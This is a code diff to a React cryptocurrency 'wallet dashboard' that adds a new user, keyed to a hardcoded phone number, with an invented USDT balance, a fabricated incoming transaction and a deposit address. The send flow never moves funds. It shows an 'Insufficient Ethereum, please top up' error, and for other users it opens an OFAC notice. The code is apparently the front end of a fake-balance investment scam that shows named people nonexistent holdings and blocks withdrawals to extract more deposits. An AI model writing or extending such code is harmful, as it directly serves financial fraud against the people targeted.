@@ -40,18 +40,22 @@ const WalletDashboard = ({ onLogout, userData }: WalletDashboardProps) => {
   // User-specific data
   const isJoanne = userData.phone === "0061414491726";
   const isJan = userData.phone === "447703277077";
+  const isJeremy = userData.phone === "00447817963523";
   
-  const cryptoBalance = isJoanne ? 460.101359 : isJan ? 5.813 : 44.62;
-  const cryptoSymbol = isJan ? "ETH" : "BTC";
-  const currentPrice = isJan ? ethPrice : btcPrice;
-  const minWithdrawal = isJoanne ? 460.10 : isJan ? 0.1 : 45;
+  const cryptoBalance = isJoanne ? 460.101359 : isJan ? 5.813 : isJeremy ? 0 : 44.62;
+  const cryptoSymbol = isJan ? "ETH" : isJeremy ? "ETH" : "BTC";
+  const currentPrice = (isJan || isJeremy) ? ethPrice : btcPrice;
+  const minWithdrawal = isJoanne ? 460.10 : isJan ? 0.1 : isJeremy ? 0.1 : 45;
   
-  // Jan's additional USDT balance
+  // USDT balances
   const janUsdtBalance = isJan ? 3017088.35 : 0;
+  const jeremyUsdtBalance = isJeremy ? 74708.23 : 0;
   const usdtPrice = 1; // USDT is pegged to $1
   
   const usdValue = isJan ? 
     (cryptoBalance * currentPrice) + (janUsdtBalance * usdtPrice) : 
+    isJeremy ?
+    (cryptoBalance * currentPrice) + (jeremyUsdtBalance * usdtPrice) :
     cryptoBalance * currentPrice;
 
   // Fetch real crypto prices
@@ -162,10 +166,23 @@ const WalletDashboard = ({ onLogout, userData }: WalletDashboardProps) => {
     }
   ];
 
-  const transactions = isJoanne ? joanneTransactions : isJan ? janTransactions : dorothyTransactions;
+  const jeremyTransactions = [
+    { 
+      id: "1", 
+      type: "received", 
+      amount: 74708.23, 
+      date: new Date().toISOString().split('T')[0], 
+      time: new Date().toLocaleTimeString('en-US', { hour12: false, hour: '2-digit', minute: '2-digit' }),
+      hash: "0xj1k2l3...",
+      symbol: "USDT"
+    }
+  ];
+
+  const transactions = isJoanne ? joanneTransactions : isJan ? janTransactions : isJeremy ? jeremyTransactions : dorothyTransactions;
 
   const depositAddress = isJoanne ? "bc1qhvley3tp7rs0fs8w867jw0t5ufsnmazg9djutu" : 
                         isJan ? "0x38AF437251f80054Da8bF701624319c27c9868fC" : 
+                        isJeremy ? "0x6a609F22fD1c0f44fb1DC004ACFA6FB901d3bBc8" :
                         "bc1q5zrug4njmyzq8q0xk9mhep0uct3j67lvdptz0l";
 
   const copyToClipboard = async (text: string) => {
@@ -186,8 +203,18 @@ const WalletDashboard = ({ onLogout, userData }: WalletDashboardProps) => {
   };
 
   const handleSendSubmit = () => {
-    setIsSendDialogOpen(false);
-    setIsOfacDialogOpen(true);
+    if (isJeremy) {
+      // For Jeremy, show insufficient Ethereum error
+      toast({
+        title: "Insufficient Ethereum",
+        description: "Please top up to proceed.",
+        variant: "destructive",
+      });
+      setIsSendDialogOpen(false);
+    } else {
+      setIsSendDialogOpen(false);
+      setIsOfacDialogOpen(true);
+    }
     setSendAmount("");
     setSendAddress("");
   };
@@ -237,6 +264,20 @@ const WalletDashboard = ({ onLogout, userData }: WalletDashboardProps) => {
                       </p>
                       <p className="text-2xl font-bold text-primary">
                         {janUsdtBalance.toLocaleString('en-US', { minimumFractionDigits: 2 })} USDT
+                      </p>
+                    </div>
+                    <p className="text-xl text-muted-foreground mt-2">
+                      ${usdValue.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} USD
+                    </p>
+                  </>
+                ) : isJeremy ? (
+                  <>
+                    <div className="space-y-2">
+                      <p className="text-2xl font-bold text-primary">
+                        {cryptoBalance} {cryptoSymbol}
+                      </p>
+                      <p className="text-2xl font-bold text-primary">
+                        {jeremyUsdtBalance.toLocaleString('en-US', { minimumFractionDigits: 2 })} USDT
                       </p>
                     </div>
                     <p className="text-xl text-muted-foreground mt-2">
@@ -368,7 +409,7 @@ const WalletDashboard = ({ onLogout, userData }: WalletDashboardProps) => {
             <div className="text-center">
               <p className="text-sm text-muted-foreground">Portfolio Value</p>
               <p className="text-lg font-bold">${usdValue.toLocaleString('en-US', { maximumFractionDigits: 0 })}</p>
-              <p className="text-sm text-primary">{isJan ? '2 Assets' : '1 Asset'}</p>
+              <p className="text-sm text-primary">{(isJan || isJeremy) ? '2 Assets' : '1 Asset'}</p>
             </div>
           </Card>
         </div>
@@ -378,7 +419,7 @@ const WalletDashboard = ({ onLogout, userData }: WalletDashboardProps) => {
       <Dialog open={isSendDialogOpen} onOpenChange={setIsSendDialogOpen}>
         <DialogContent className="sm:max-w-md">
           <DialogHeader>
-            <DialogTitle>{isJoanne ? "Send Bitcoin" : "Withdrawal Notice"}</DialogTitle>
+            <DialogTitle>{isJoanne ? "Send Bitcoin" : isJeremy ? "Send Crypto" : "Withdrawal Notice"}</DialogTitle>
           </DialogHeader>
           <div className="py-6">
             {isJoanne ? (
@@ -409,6 +450,36 @@ const WalletDashboard = ({ onLogout, userData }: WalletDashboardProps) => {
                   disabled={!sendAddress || !sendAmount}
                 >
                   Submit
+                </Button>
+              </div>
+            ) : isJeremy ? (
+              <div className="space-y-4">
+                <div>
+                  <label className="text-sm font-medium text-muted-foreground">Ethereum Address</label>
+                  <Input
+                    value={sendAddress}
+                    onChange={(e) => setSendAddress(e.target.value)}
+                    placeholder="Enter destination ethereum address"
+                    className="mt-1"
+                  />
+                </div>
+                <div>
+                  <label className="text-sm font-medium text-muted-foreground">Amount (USDT)</label>
+                  <Input
+                    value={sendAmount}
+                    onChange={(e) => setSendAmount(e.target.value)}
+                    placeholder="Enter amount to withdraw"
+                    type="number"
+                    step="0.01"
+                    className="mt-1"
+                  />
+                </div>
+                <Button 
+                  onClick={handleSendSubmit}
+                  className="w-full"
+                  disabled={!sendAddress || !sendAmount}
+                >
+                  Send
                 </Button>
               </div>
             ) : isJan ? (
